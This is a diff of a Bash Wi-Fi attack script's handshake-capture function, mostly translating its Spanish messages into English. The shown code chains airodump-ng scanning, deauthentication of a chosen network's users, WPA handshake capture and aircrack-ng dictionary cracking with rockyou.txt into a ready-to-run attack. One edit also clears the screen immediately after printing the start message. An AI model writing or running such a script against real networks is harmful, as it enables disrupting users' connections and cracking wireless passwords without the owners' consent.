@@ -159,13 +159,13 @@ updatepackages() {
 # 1) ataque
 handshake_ataque() {
 	clear
-	echo -e "\n${turquoiseColour}[*]$grayColour Starting Handshake attack"
+	echo -e "\n${turquoiseColour}[*]$grayColour Starting Handshake attack"; clear
 	sleep 1
  	tput cnorm
    	xterm -e "airodump-ng -w /tmp/xtermNeT --output-format csv ${tar}" &
 	xtermnet=$!
 	sleep 0.5; kill -9 $xtermnet; wait $xtermnet 2>/dev/null
-	echo -e "->->->->-> Select a network <-<-<-<-<-\n\n\n"
+	echo -e "${blueColour}->->->->-> Select a network <-<-<-<-<-\n\n\n"
 	while IFS= read -r line; do
 		macrepeat=$(grep $line /tmp/xtermNeT-01.csv | wc -l)
 		if [[ "$macrepeat" > 1 ]]; then
@@ -174,12 +174,12 @@ handshake_ataque() {
 	done < <(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1 | sed '/Station/,1d')
 
 	launch_irodump=$(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1,6,4,9,14 | sed 's/,/   /g; /Station/,$d' | sed '$d' | nl -w3 -s "]    " | sed 's/[0-9]/[&/' | sed "s/\[/${rojo}\[${extrojo}/g; s/\]/${rojo}\]${extrojo}/g " | sed 's/WPA2 WPA/WPA2/;s/         -/        -/;s/        -/            -/;s/[0-9][0-9][0-9]    /&-/;s/    -W/   W/g;s/    -        -/           -/g;s/WEP    /WEP     /;s/WEP      /WEP     /; s/WPA    /WPA     /;s/WPA      /WPA     / ; s/OPN    /OPN     /; s/OPN      /OPN     /; s/    $/    (Hidden Wifi)/; s/ -1    (/ -1     (/;s/    ++/    /; s/    +/    /;s/+//g')
-	echo -e "  Number          Bssid         CH    Encry   PWR       Essid\n----------------------------------------------------------------------\n$launch_irodump"
+	echo -e "           Bssid        CH    Encry   PWR       Essid\n----------------------------------------------------------------------\n$launch_irodump"
 	echo -ne "\n$greenColour[?]$grayColour Select a network: " && read ap
 	echo -ne "${greenColour}[?]$grayColour What channel is ${ap}?: " && read channel
 	tput civis
 	$cleancolor
-	echo -e "${greenColour}[*]$grayColour Se esta desautenticando a los usuarios de la red"
+	echo -e "${greenColour}[*]$grayColour Network users are being deauthenticated"
 	$cleancolor
 
 	xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
@@ -189,7 +189,7 @@ handshake_ataque() {
 	aireplay_xterm_PID=$!
 	sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
 
-	echo -e "${redColour}\n[%]$grayColour Esperando Handshake\n"
+	echo -e "${redColour}\n[%]$grayColour Waiting for Handshake\n"
 	$cleancolor
 								
 	sleep 10; kill -9 $airodump_filter_xterm_PID
@@ -197,12 +197,12 @@ handshake_ataque() {
 	test -f Handshake-01.cap
 	if [ "$(echo $?)" == "0" ]; then
 		tput cnorm
-		echo -e "\n${yellowColour}[*]$grayColour Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt"
-		echo -ne "$blueColour[?]$grayColour Ruta del Diccionario al usar: " && read dicc
+		echo -e "\n${yellowColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt"
+		echo -ne "$blueColour[?]$grayColour Dictionary path to use: " && read dicc
 		$cleancolor; tput civis
 		xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"
 	else 
-		echo -e "${redColour}\n[!]$grayColour No se ha capturado el Handshake"
+		echo -e "${redColour}\n[!]$grayColour Handshake has not been captured"
 		sleep 2
 	fi
 }
